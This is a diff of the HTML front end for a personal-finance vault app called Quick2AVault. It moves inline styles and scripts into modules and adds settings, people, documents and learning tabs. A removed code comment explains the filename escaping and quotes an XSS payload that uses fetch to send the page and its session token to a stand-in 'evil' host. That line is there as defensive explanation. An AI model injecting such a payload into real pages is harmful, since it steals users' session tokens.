@@ -4,284 +4,380 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Quick2AVault</title>
-<style>
-  /* Tufte-ish: maximise data-ink, no chartjunk, no gradients, no shadows. */
-  :root {
-    --bg:#0e1013; --panel:#15181d; --line:#242930;
-    --ink:#e6e9ee; --dim:#8b95a3; --faint:#5b6672;
-    --out:#ff6b5e; --in:#3ddc84; --xfer:#7aa2f7; --ok:#3ddc84; --warn:#f0b429;
-    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,monospace;
-  }
-  *{box-sizing:border-box;margin:0;padding:0}
-  body{background:var(--bg);color:var(--ink);
-       font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,sans-serif;
-       padding:28px 32px 60px;max-width:1180px;margin:0 auto}
-
-  header{display:flex;align-items:baseline;justify-content:space-between;
-         border-bottom:1px solid var(--line);padding-bottom:14px;margin-bottom:26px}
-  h1{font-size:16px;font-weight:600;letter-spacing:-.2px}
-  h1 span{color:var(--faint);font-weight:400}
-  .conn{font:11px var(--mono);color:var(--faint);display:flex;align-items:center;gap:7px}
-  .dot{width:7px;height:7px;border-radius:50%;background:var(--faint)}
-  .dot.live{background:var(--ok)}
-  .dot.dead{background:var(--out)}
-
-  /* ── hero ─────────────────────────────────────────────────────── */
-  .heroes{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;
-          background:var(--line);border:1px solid var(--line);margin-bottom:8px}
-  .hero{background:var(--panel);padding:18px 20px}
-  .hero .k{font-size:10.5px;letter-spacing:.9px;text-transform:uppercase;color:var(--dim)}
-  .hero .v{font:600 30px/1.15 var(--mono);letter-spacing:-1px;margin-top:9px;
-           font-variant-numeric:tabular-nums}
-  .hero .n{font-size:11.5px;color:var(--faint);margin-top:6px}
-  .hero.x .v{color:var(--xfer)}
-
-  .callout{border:1px solid var(--line);border-left:2px solid var(--ok);
-           background:var(--panel);padding:11px 16px;margin-bottom:26px;
-           font-size:13px;color:var(--dim)}
-  .callout b{color:var(--ink);font-weight:600}
-  .callout .strike{color:var(--faint);text-decoration:line-through}
-
-  /* ── layout ───────────────────────────────────────────────────── */
-  .cols{display:grid;grid-template-columns:1fr 380px;gap:26px;align-items:start}
-  h2{font-size:10.5px;letter-spacing:1px;text-transform:uppercase;color:var(--dim);
-     margin-bottom:11px;font-weight:600}
-
-  /* ── transactions ─────────────────────────────────────────────── */
-  .txn{border:1px solid var(--line);background:var(--panel);padding:14px 16px;
-       margin-bottom:9px;cursor:pointer}
-  .txn:hover{border-color:#37404b}
-  .txn.sel{border-color:var(--xfer)}
-  .txn .r1{display:flex;align-items:baseline;gap:11px}
-  .tag{font:600 9.5px var(--mono);letter-spacing:.7px;padding:2px 6px;border:1px solid}
-  .tag.out{color:var(--out);border-color:#4a2622}
-  .tag.in{color:var(--in);border-color:#1d4030}
-  .tag.transfer{color:var(--xfer);border-color:#25344f}
-  .amt{font:600 19px var(--mono);font-variant-numeric:tabular-nums;letter-spacing:-.5px}
-  .cp{color:var(--dim);font-size:13px;margin-left:auto;text-align:right}
-  .meta{font:11px var(--mono);color:var(--faint);margin-top:7px}
-  .legs{margin-top:10px;padding-top:9px;border-top:1px solid var(--line)}
-  .leg{display:flex;gap:9px;font:11.5px var(--mono);color:var(--dim);padding:1.5px 0}
-  .leg .d{color:var(--out)} .leg .c{color:var(--in)}
-  .leg .a{color:var(--faint)}
-  .ev{display:flex;gap:8px;align-items:center;font-size:11.5px;color:var(--faint);
-      margin-top:5px}
-  .ev .role{font:10px var(--mono);color:var(--dim);border:1px solid var(--line);padding:1px 5px}
-  .badge2{display:inline-block;font:600 10px var(--mono);color:var(--ok);
-          border:1px solid #1d4030;padding:1.5px 6px;margin-left:8px}
-
-  /* ── feed ─────────────────────────────────────────────────────── */
-  .feed{border:1px solid var(--line);background:var(--panel);max-height:520px;
-        overflow-y:auto;font:11.5px var(--mono)}
-  .fe{padding:7px 12px;border-bottom:1px solid var(--line);display:flex;gap:9px;
-      align-items:baseline;animation:slide .25s ease}
-  @keyframes slide{from{opacity:0;transform:translateY(-4px)}to{opacity:1}}
-  .fe:last-child{border-bottom:0}
-  .fe .t{color:var(--faint);font-size:10px;flex:0 0 52px}
-  .fe .n{flex:1;color:var(--dim);word-break:break-word}
-  .fe.DocumentReceived .n{color:var(--ink)}
-  .fe.MarkdownReady .n,.fe.AnalysisComplete .n{color:var(--dim)}
-  .fe.TransactionRecorded .n{color:var(--in)}
-  .fe.MatchProposed .n{color:var(--ok);font-weight:600}
-  .fe.DocumentDuplicate .n{color:var(--warn)}
-
-  /* ── evidence card ────────────────────────────────────────────── */
-  .card{border:1px solid var(--line);background:var(--panel);padding:16px;margin-top:22px}
-  .card h3{font-size:12px;margin-bottom:12px;font-weight:600}
-  .card .sum{border-top:1px solid var(--line);margin-top:12px;padding-top:11px;
-             font-size:12.5px;color:var(--ok)}
-  .doc{border:1px solid var(--line);padding:9px 11px;margin-bottom:7px}
-  .doc .fn{font-size:12px}
-  .doc .rf{font:10.5px var(--mono);color:var(--faint);margin-top:5px;word-break:break-all}
-  .doc .rf em{color:var(--ok);font-style:normal}
-  .empty{color:var(--faint);font-size:12.5px;padding:16px 0}
-  .prov{font:10.5px var(--mono);color:var(--faint);margin-top:10px;
-        padding-top:9px;border-top:1px solid var(--line)}
-</style>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/ui/ui.css">
 </head>
 <body>
 
-<header>
-  <h1>Quick2AVault <span>— every rupee a transaction, every transaction evidenced</span></h1>
-  <div class="conn"><span class="dot" id="dot"></span><span id="conn">connecting</span></div>
-</header>
-
-<div class="heroes">
-  <div class="hero"><div class="k">Spending</div><div class="v" id="spend">—</div>
-    <div class="n" id="spendN">this financial year</div></div>
-  <div class="hero x"><div class="k">Transfers</div><div class="v" id="xfer">—</div>
-    <div class="n">between your own accounts — not spending</div></div>
-  <div class="hero"><div class="k">Ledger</div><div class="v" id="counts">—</div>
-    <div class="n" id="countsN">documents → transactions</div></div>
+<div class="topbar">
+  <h1>Quick2AVault</h1>
+  <div class="conn"><span class="dot" id="dot"></span><span id="clock" style="font:11px var(--mono);color:var(--dim)"></span></div>
 </div>
 
-<div class="callout" id="callout">waiting for the vault…</div>
+<div class="tabs" id="tabs">
+  <button data-tab="obs" class="on">Your Money</button>
+  <button data-tab="review">Documents Browser</button>
+  <button data-tab="people">People &amp; Accounts</button>
+  <button data-tab="learning">Learning Review</button>
+  <button data-tab="settings">Settings &amp; Customisations</button>
+</div>
 
-<div class="cols">
-  <div>
-    <h2>Transactions</h2>
-    <div id="txns"><div class="empty">No transactions yet. Drop a document into the watched folder.</div></div>
+<!-- ════════════════════════════════════════════════════════════════════════
+     DASHBOARD TAB
+════════════════════════════════════════════════════════════════════════ -->
+<div class="tab on" id="tab-obs">
+  <div class="periods" id="periods"></div>
+
+  <section>
+    <h2>Money <span class="sub" id="moneyPeriod">— this financial year</span></h2>
+    <div class="heroes" id="heroes">
+      <div class="hero in click" data-bucket="income">
+        <div class="k">Income</div><div class="v" id="income">—</div>
+        <div class="n" id="incomeN"><b>0</b> documents · net of refunds</div>
+        <div class="sub" id="incomeSub"></div>
+      </div>
+      <div class="hero out click" data-bucket="spending">
+        <div class="k">Spending</div><div class="v" id="spend">—</div>
+        <div class="n" id="spendN"><b>0</b> documents · net of refunds</div>
+        <div class="sub" id="spendSub"></div>
+      </div>
+      <div class="hero inv click" data-bucket="investments">
+        <div class="k">Investments</div><div class="v" id="invest">—</div>
+        <div class="n" id="investN"><b>0</b> documents · purchases</div>
+        <div class="sub" id="investSub"></div>
+      </div>
+      <div class="hero x" data-bucket="transfers">
+        <div class="k">Transfers</div><div class="v" id="xfer">—</div>
+        <div class="n">between own accounts — not spending</div>
+        <div class="sub" id="xferSub"></div>
+      </div>
+    </div>
     <div id="card"></div>
+  </section>
+
+  <section>
+    <h2>Documents pipeline</h2>
+    <div class="board" id="board"></div>
+    <div class="pcols">
+      <div>
+        <h2 style="margin-top:4px">Intake <span class="sub" id="intakeCount">— items</span></h2>
+        <div class="intake" id="intake"><div class="empty">waiting for intake…</div></div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════════════════
+     SETTINGS TAB
+════════════════════════════════════════════════════════════════════════ -->
+<div class="tab" id="tab-settings">
+  <!-- Suggestion banners (shown only when jurisdiction suggestions exist and slot is unset) -->
+  <div id="suggestionBanners"></div>
+
+  <div class="settings-cols">
+      <div class="panel">
+        <h3>Primary inference</h3>
+        <div class="hint" style="margin-bottom:10px">Used for fast text tasks like categorization, normalization, and short explanations.</div>
+        <div class="field">
+          <label>Provider</label>
+          <div class="provider-picker" id="aiProviderPicker"></div>
+          <select id="aiProvider" style="display:none"></select>
+        </div>
+        <div class="field" id="aiCustomUrlRow" style="display:none">
+          <label>Base URL</label>
+          <input type="text" id="aiBaseUrl" placeholder="https://your-provider.com/v1">
+        </div>
+        <div class="field" id="aiUrlRow">
+          <label>Base URL</label>
+          <input type="text" id="aiBaseUrlRo" readonly style="opacity:0.6">
+        </div>
+        <div class="field">
+          <label>API key</label>
+          <div id="aiKeyContainer">
+            <input type="password" id="aiApiKey" placeholder="paste your API key">
+            <div class="hint" id="aiKeySrc"></div>
+          </div>
+        </div>
+        <div class="field">
+          <label>Model</label>
+          <select id="aiModel"><option value="">select a provider first</option></select>
+          <div class="hint" id="aiModelNote"></div>
+        </div>
+        <div class="save-row">
+          <button class="act" id="aiTest">Test connection</button>
+          <span class="msg" id="aiMsg"></span>
+        </div>
+      </div>
+
+      <div class="panel">
+        <h3>Secondary inference</h3>
+        <div class="hint" style="margin-bottom:10px">Used for image and document tasks like receipts, screenshots, and scanned statements.</div>
+        <div class="field">
+          <label>Provider</label>
+          <div class="provider-picker" id="ai2ProviderPicker"></div>
+          <select id="ai2Provider" style="display:none"></select>
+        </div>
+        <div class="field" id="ai2CustomUrlRow" style="display:none">
+          <label>Base URL</label>
+          <input type="text" id="ai2BaseUrl" placeholder="https://your-provider.com/v1">
+        </div>
+        <div class="field" id="ai2UrlRow">
+          <label>Base URL</label>
+          <input type="text" id="ai2BaseUrlRo" readonly style="opacity:0.6">
+        </div>
+        <div class="field">
+          <label>API key</label>
+          <div id="ai2KeyContainer">
+            <input type="password" id="ai2ApiKey" placeholder="paste your API key">
+            <div class="hint" id="ai2KeySrc"></div>
+          </div>
+        </div>
+        <div class="field" id="ai2ModelRow">
+          <label>Model</label>
+          <select id="ai2Model"><option value="">select a provider first</option></select>
+          <div class="hint" id="ai2ModelNote"></div>
+        </div>
+        <div class="save-row">
+          <button class="act" id="ai2Test">Test connection</button>
+          <span class="msg" id="ai2Msg"></span>
+        </div>
+      </div>
   </div>
-  <div>
-    <h2>Live intake</h2>
-    <div class="feed" id="feed"><div class="fe"><span class="t">—</span><span class="n">waiting for events…</span></div></div>
+
+
+  <div class="settings-cols" style="margin-top:7px">
+      <div class="panel">
+        <h3>Jurisdiction pack</h3>
+        <div class="field">
+          <label>Pack</label>
+          <select id="jurSelect"></select>
+          <div class="hint" id="jurInfo"></div>
+        </div>
+        <div class="save-row">
+          <button class="act" id="jurSave">Save</button>
+          <span class="msg" id="jurMsg"></span>
+        </div>
+      </div>
+
+      <div class="panel">
+        <h3>Gmail Dropbox</h3>
+        <div class="grid2">
+          <div><div style="font:10.5px var(--mono);color:var(--faint);text-transform:uppercase">Address</div>
+            <div style="font:12px var(--mono);margin-top:3px" id="gAddr">—</div></div>
+          <div><div style="font:10.5px var(--mono);color:var(--faint);text-transform:uppercase">Status</div>
+            <div style="font:12px var(--mono);margin-top:3px" id="gStatus">—</div></div>
+        </div>
+        <div class="field" style="margin-top:14px">
+          <label>Pull from</label>
+          <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap">
+            <input type="date" id="gAfterDate" style="font:12px var(--mono)">
+            <label style="display:flex;align-items:center;gap:4px;font:11px var(--mono);color:var(--dim);cursor:pointer">
+              <input type="checkbox" id="gForce"> Force fresh pull
+            </label>
+          </div>
+          <div class="hint">Force ignores incremental sync and re-downloads from the date above.</div>
+        </div>
+        <div class="save-row" style="margin-top:10px">
+          <button class="act" id="gSync">Resync</button>
+          <button class="ghost" id="gConnect">Connect</button>
+          <button class="ghost" id="gDisconnect">Disconnect</button>
+          <span class="msg" id="gMsg"></span>
+        </div>
+      </div>
+  </div>
+
+  <div class="panel" style="margin-top:7px">
+    <h3>Vault summary</h3>
+    <div class="grid2">
+      <div><div style="font:10.5px var(--mono);color:var(--faint);text-transform:uppercase">Root</div>
+        <div style="font:12px var(--mono);margin-top:3px" id="vRoot">—</div></div>
+      <div><div style="font:10.5px var(--mono);color:var(--faint);text-transform:uppercase">Drop folder</div>
+        <div style="font:12px var(--mono);margin-top:3px" id="vDrop">—</div></div>
+      <div><div style="font:10.5px var(--mono);color:var(--faint);text-transform:uppercase">Database</div>
+        <div style="font:12px var(--mono);margin-top:3px" id="vDb">—</div></div>
+      <div><div style="font:10.5px var(--mono);color:var(--faint);text-transform:uppercase">AI models</div>
+        <div style="font:12px var(--mono);margin-top:3px">
+          <div id="vAi">—</div>
+          <div id="vAi2" style="margin-top:3px">—</div>
+        </div></div>
+    </div>
+  </div>
+
+<!-- Danger Zone — last item in Settings, matches Vault summary width. -->
+<div class="danger-zone">
+  <div class="danger-panel">
+    <h3>Danger Zone</h3>
+    <div class="danger-options">
+      <label class="danger-opt">
+        <input type="radio" name="dangerMode" value="none" checked>
+        <span class="danger-opt-body">
+          <span class="danger-opt-title">I don't want to do this</span>
+          <span class="danger-opt-desc">No action will be taken.</span>
+        </span>
+      </label>
+      <label class="danger-opt">
+        <input type="radio" name="dangerMode" value="flush">
+        <span class="danger-opt-body">
+          <span class="danger-opt-title">Data Flush</span>
+          <span class="danger-opt-desc">Wipes documents, people, and vault contents. Settings, API keys, and Gmail are preserved.</span>
+        </span>
+      </label>
+      <label class="danger-opt">
+        <input type="radio" name="dangerMode" value="factory">
+        <span class="danger-opt-body">
+          <span class="danger-opt-title">Factory Reset</span>
+          <span class="danger-opt-desc">Full reset to a blank install. Everything is deleted, including all settings and API keys.</span>
+        </span>
+      </label>
+    </div>
+    <div class="danger-confirm-row" id="dangerConfirmRow" style="display:none">
+      <span class="danger-confirm-label">Type <b>CONFIRM</b> to proceed:</span>
+      <input type="text" id="dangerConfirmInput" placeholder="CONFIRM" autocomplete="off" class="danger-confirm-input">
+      <button class="danger-cancel-btn" id="dangerCancelBtn">Cancel</button>
+      <button class="danger-go-btn" id="dangerGoBtn" disabled>Erase</button>
+    </div>
+    <button class="danger-btn" id="flushBtn" disabled>Flush Data</button>
+    <span class="msg" id="flushMsg" style="margin-left:10px"></span>
+  </div>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════════════════
+     PEOPLE TAB
+════════════════════════════════════════════════════════════════════════ -->
+<div class="tab" id="tab-people">
+  <h2>People &amp; Accounts <span class="sub">manage identities of owners, members, organisations, accounts and instruments</span></h2>
+
+  <div class="panel">
+    <h3>Household <span style="color:var(--faint);font-weight:400;text-transform:none" id="houseCount"></span></h3>
+    <div class="hint" style="margin:-6px 0 10px">The people this vault belongs to. Exactly one is you (owner); others are members who share it (spouse, family).</div>
+    <div id="houseList"><div class="empty">loading…</div></div>
+  </div>
+
+  <div class="panel collapse" id="otherPanel">
+    <h3 class="collapse-hdr">Other people <span style="color:var(--faint);font-weight:400;text-transform:none" id="otherCount"></span> <span class="collapse-arrow">▾</span></h3>
+    <div class="collapse-body">
+      <div class="hint" style="margin:-6px 0 10px">Everyone else the documents name — merchants, landlords, tenants, employers. Classify each by their relationship to you.</div>
+      <div id="otherList"><div class="empty">loading…</div></div>
+    </div>
+  </div>
+
+  <div class="panel collapse" id="orgPanel">
+    <h3 class="collapse-hdr">Organisations <span style="color:var(--faint);font-weight:400;text-transform:none" id="orgCount"></span> <span class="collapse-arrow">▾</span></h3>
+    <div class="collapse-body">
+      <div class="hint" style="margin:-6px 0 10px">Merchants, companies, and other non-person entities. Click to inspect cross-kind identifier conflicts.</div>
+      <div id="orgList"><div class="empty">loading…</div></div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <h3>Accounts <span style="color:var(--faint);font-weight:400;text-transform:none" id="acctCount"></span></h3>
+    <div class="hint" style="margin:-6px 0 10px">Banks, brokers, wallets, and instruments. Click to inspect cross-kind identifier conflicts.</div>
+    <div id="acctList"><div class="empty">loading…</div></div>
+  </div>
+
+</div>
+
+<!-- ════════════════════════════════════════════════════════════════════════
+     DOCUMENTS REVIEW TAB
+════════════════════════════════════════════════════════════════════════ -->
+<div class="tab" id="tab-review">
+  <div class="periods" id="periodsReview"></div>
+
+  <section>
+    <h2>Documents pipeline</h2>
+    <div class="board" id="boardReview"></div>
+  </section>
+
+  <div class="panel">
+    <h3>Documents <span style="color:var(--faint);font-weight:400;text-transform:none" id="docCount"></span></h3>
+    <div id="docList"><div class="empty">loading…</div></div>
   </div>
 </div>
 
+<!-- ════════════════════════════════════════════════════════════════════════
+     LEARNING TAB
+════════════════════════════════════════════════════════════════════════ -->
+<div class="tab" id="tab-learning">
+  <h2>Learning <span class="sub">curiosity engine — questions and learned rules</span></h2>
+
+  <div class="panel">
+    <h3>Master switch</h3>
+    <div class="row" style="align-items:center">
+      <div style="font:13px var(--mono)" id="learnStatus">—</div>
+      <button class="act" id="learnToggle">—</button>
+    </div>
+    <div class="hint" id="learnBudget"></div>
+  </div>
+
+  <div class="grid2">
+    <div class="panel">
+      <h3>Open questions <span style="color:var(--faint);font-weight:400;text-transform:none" id="qCount"></span></h3>
+      <div id="qList"><div class="empty">loading…</div></div>
+    </div>
+    <div class="panel">
+      <h3>Learned rules <span style="color:var(--faint);font-weight:400;text-transform:none" id="rCount"></span></h3>
+      <div id="rList"><div class="empty">loading…</div></div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <h3>Answered questions <span style="color:var(--faint);font-weight:400;text-transform:none" id="aCount"></span></h3>
+    <div id="aList"><div class="empty">loading…</div></div>
+  </div>
+</div>
+
+<footer id="footer"></footer>
+
+<!-- Scripts loaded in order: shared utils, then feature modules, then init. -->
+<script>const TOKEN = "%%TOKEN%%";</script>
+<script src="/ui/ui.js"></script>
+<script src="/ui/dashboard.js"></script>
+<script src="/ui/settings.js"></script>
+<script src="/ui/people.js"></script>
+<script src="/ui/documents.js"></script>
+<script src="/ui/learning.js"></script>
 <script>
-const TOKEN = "%%TOKEN%%";
-const H = { Authorization: "Bearer " + TOKEN };
-const api = (p) => fetch(p, { headers: H }).then((r) => r.json());
-
-const money = (m) => m === null || m === undefined ? "—"
-  : "₹" + (m / 100).toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
-const clock = () => new Date().toTimeString().slice(0, 8);
-
-/**
- * Escape API- and event-derived values before they reach an innerHTML sink.
- *
- * This is not theoretical: attachment filenames come from email headers, flow
- * through intake into `documents.original_filename`, and are rendered in the
- * transaction list, the evidence card, and the live feed. Anyone who can email
- * the vault address could otherwise name a file
- * `<img src=x onerror=fetch('//evil/'+document.body.innerHTML)>` and exfiltrate
- * the page — which, on this page, includes the API session token.
- *
- * Quotes are escaped too because several values land inside single-quoted
- * attributes (data-id, class), where &apos; alone would let an attacker close
- * the attribute.
- */
-const esc = (v) => v === null || v === undefined ? "" : String(v)
-  .replace(/&/g, "&amp;")
-  .replace(/</g, "&lt;")
-  .replace(/>/g, "&gt;")
-  .replace(/"/g, "&quot;")
-  .replace(/'/g, "&#39;");
-
-let selected = null;
-
-async function refresh() {
-  const [s, t] = await Promise.all([api("/v1/snapshot"), api("/v1/transactions")]);
-
-  document.getElementById("spend").textContent = money(s.spending_minor);
-  document.getElementById("xfer").textContent = money(s.transfers_minor);
-  document.getElementById("counts").textContent = s.counts.documents + " → " + s.counts.transactions;
-  document.getElementById("countsN").textContent =
-    s.counts.documents + " documents, " + s.counts.transactions + " transactions, "
-    + s.counts.evidence_links + " evidence links";
-
-  // The headline: what a document-counting tool would have reported.
-  const naive = t.transactions.reduce((a, x) => a + x.amount_minor * (x.evidence?.length || 1), 0);
-  const co = document.getElementById("callout");
-  if (s.counts.documents > s.counts.transactions) {
-    co.innerHTML = "<b>" + s.counts.documents + " documents describe "
-      + s.counts.transactions + " transactions.</b> Counting documents would report "
-      + "<span class='strike'>" + money(naive) + "</span> — this vault reports <b>"
-      + money(s.spending_minor) + "</b>, because linked evidence is counted once "
-      + "and wallet loads are transfers, not spending.";
-  } else {
-    co.textContent = "Drop a second document describing the same payment to see the double-count get killed.";
-  }
-
-  const box = document.getElementById("txns");
-  if (!t.transactions.length) {
-    box.innerHTML = "<div class='empty'>No transactions yet. Drop a document into the watched folder.</div>";
-    return;
-  }
-  box.innerHTML = t.transactions.map((x) => {
-    const legs = (x.legs || []).map((l) =>
-      "<div class='leg'><span class='" + (l.leg === "debit" ? "d" : "c") + "'>"
-      + esc(l.leg).padEnd(6) + "</span><span>" + money(l.amount_minor) + "</span>"
-      + "<span class='a'>" + esc(l.account) + "</span></div>").join("");
-    const ev = (x.evidence || []).map((e) =>
-      "<div class='ev'><span class='role'>" + esc(e.evidence_role) + "</span>"
-      + "<span>" + esc(e.original_filename) + "</span></div>").join("");
-    const multi = (x.evidence || []).length > 1
-      ? "<span class='badge2'>" + x.evidence.length + " DOCS · ONE RUPEE</span>" : "";
-    return "<div class='txn" + (selected === x.id ? " sel" : "") + "' data-id='" + esc(x.id) + "'>"
-      + "<div class='r1'><span class='tag " + esc(x.direction) + "'>" + esc(x.direction).toUpperCase() + "</span>"
-      + "<span class='amt'>" + money(x.amount_minor) + "</span>" + multi
-      + "<span class='cp'>" + esc(x.counterparty_name || "no counterparty — own accounts") + "</span></div>"
-      + "<div class='meta'>" + esc(x.occurred_at) + " · " + esc(x.fy_key) + " · rail=" + esc(x.payment_rail || "?")
-      + " · " + esc(x.status) + "</div>"
-      + "<div class='legs'>" + legs + ev + "</div></div>";
-  }).join("");
-
-  box.querySelectorAll(".txn").forEach((el) =>
-    el.onclick = () => showCard(el.dataset.id));
-}
-
-async function showCard(id) {
-  selected = id;
-  const c = await api("/v1/transactions/" + id + "/evidence");
-  const t = c.transaction;
-  const docs = c.evidence.map((e) => {
-    const refs = e.extraction && e.extraction.reference_ids || {};
-    const shared = Object.entries(refs).map(([k, v]) =>
-      // Highlight the key that appears on more than one document — that's the
-      // join that collapsed them into one transaction.
-      c.evidence.filter((o) => o.extraction && o.extraction.reference_ids
-        && Object.values(o.extraction.reference_ids).includes(v)).length > 1
-        ? "<em>" + esc(k) + "=" + esc(v) + "</em>" : esc(k) + "=" + esc(v)).join("  ");
-    return "<div class='doc'><div class='fn'>" + esc(e.original_filename) + "</div>"
-      + "<div class='rf'>" + esc(e.evidence_role) + " · linked by " + esc(e.linked_by)
-      + (e.match_score ? " at " + Number(e.match_score).toFixed(2) : "")
-      + (shared ? "<br>" + shared : "") + "</div></div>";
-  }).join("");
-  const prov = (c.provenance || []).map((p) =>
-    esc(p.field) + "=" + esc(p.value) + " [" + esc(p.source) + "]").join("   ");
-  document.getElementById("card").innerHTML =
-    "<div class='card'><h3>Evidence · " + money(t.amount_minor) + " · "
-    + esc(t.counterparty_name || "transfer") + "</h3>" + docs
-    + (prov ? "<div class='prov'>" + prov + "</div>" : "")
-    + "<div class='sum'>" + esc(c.summary) + "</div></div>";
-  refresh();
-}
-
-// ── live event stream ────────────────────────────────────────────
-const DESC = {
-  DocumentReceived:   (e) => "received  " + e.filename,
-  DocumentDuplicate:  (e) => "duplicate  " + e.filename + "  (same bytes — ignored)",
-  MarkdownReady:      (e) => "converted  " + e.chars + " chars",
-  AnalysisComplete:   (e) => "analysed  " + e.document_id.slice(0, 12),
-  TransactionRecorded:(e) => "transaction  " + money(e.amount_minor) + "  " + e.direction,
-  MatchProposed:      (e) => "MATCHED  score " + Number(e.score).toFixed(2) + "  → one rupee",
-  JobStateChanged:    (e) => e.phase + "  " + e.state,
+// ── tab navigation + init ────────────────────────────────────────
+// TAB_LOADERS references functions from all feature modules, so it
+// must be defined after all scripts have loaded.
+const TAB_LOADERS = {
+  settings: loadSettings,
+  people: loadPeople,
+  review: loadReview,
+  learning: loadLearning,
 };
-function push(type, data) {
-  const f = document.getElementById("feed");
-  if (f.dataset.virgin !== "1") { f.innerHTML = ""; f.dataset.virgin = "1"; }
-  const d = document.createElement("div");
-  d.className = "fe " + type;
-  const say = DESC[type] ? DESC[type](data) : type;
-  d.innerHTML = "<span class='t'>" + clock() + "</span><span class='n'>" + esc(say) + "</span>";
-  f.prepend(d);
-  while (f.children.length > 80) f.lastChild.remove();
-}
+document.getElementById("tabs").querySelectorAll("button").forEach((b) =>
+  b.onclick = () => {
+    activeTab = b.dataset.tab;
+    localStorage.setItem("q2av_tab", activeTab);
+    document.querySelectorAll(".tabs button").forEach((x) => x.classList.toggle("on", x === b));
+    document.querySelectorAll(".tab").forEach((t) => t.classList.toggle("on", t.id === "tab-" + activeTab));
+    if (TAB_LOADERS[activeTab]) TAB_LOADERS[activeTab]();
+  });
+// Restore the saved tab on load.
+document.querySelectorAll(".tabs button").forEach((x) => x.classList.toggle("on", x.dataset.tab === activeTab));
+document.querySelectorAll(".tab").forEach((t) => t.classList.toggle("on", t.id === "tab-" + activeTab));
 
-function connect() {
-  // EventSource can't set headers, so the token rides as a query param on
-  // localhost. The daemon accepts either.
-  const es = new EventSource("/v1/events?token=" + encodeURIComponent(TOKEN));
-  const dot = document.getElementById("dot"), lbl = document.getElementById("conn");
-  es.onopen = () => { dot.className = "dot live"; lbl.textContent = "live"; };
-  es.onerror = () => { dot.className = "dot dead"; lbl.textContent = "reconnecting"; };
-  for (const type of Object.keys(DESC).concat("Ready")) {
-    es.addEventListener(type, (m) => {
-      let d = {}; try { d = JSON.parse(m.data); } catch {}
-      if (type !== "Ready") push(type, d);
-      if (["TransactionRecorded", "MatchProposed", "AnalysisComplete", "DocumentReceived"].includes(type)) {
-        clearTimeout(window.__rt);
-        window.__rt = setTimeout(refresh, 220);   // debounce bursts
-      }
-    });
-  }
-}
-
-refresh();
+// ── init ─────────────────────────────────────────────────────────
+renderPeriods();
+refreshObs();
 connect();
-setInterval(refresh, 8000);
+// Load the restored tab's data (e.g. Settings, People, etc.).
+if (TAB_LOADERS[activeTab]) TAB_LOADERS[activeTab]();
+setInterval(() => { if (activeTab === "obs") refreshObs(); }, 8000);
+
+// Live clock in the header — ticks every second.
+function tickClock() {
+  const now = new Date();
+  const d = now.toLocaleDateString("en-US", { weekday: "long", year: "numeric", month: "short", day: "numeric" });
+  const t = now.toLocaleTimeString("en-US", { hour12: false });
+  document.getElementById("clock").textContent = d + " " + t;
+}
+tickClock();
+setInterval(tickClock, 1000);
 </script>
 </body>
 </html>
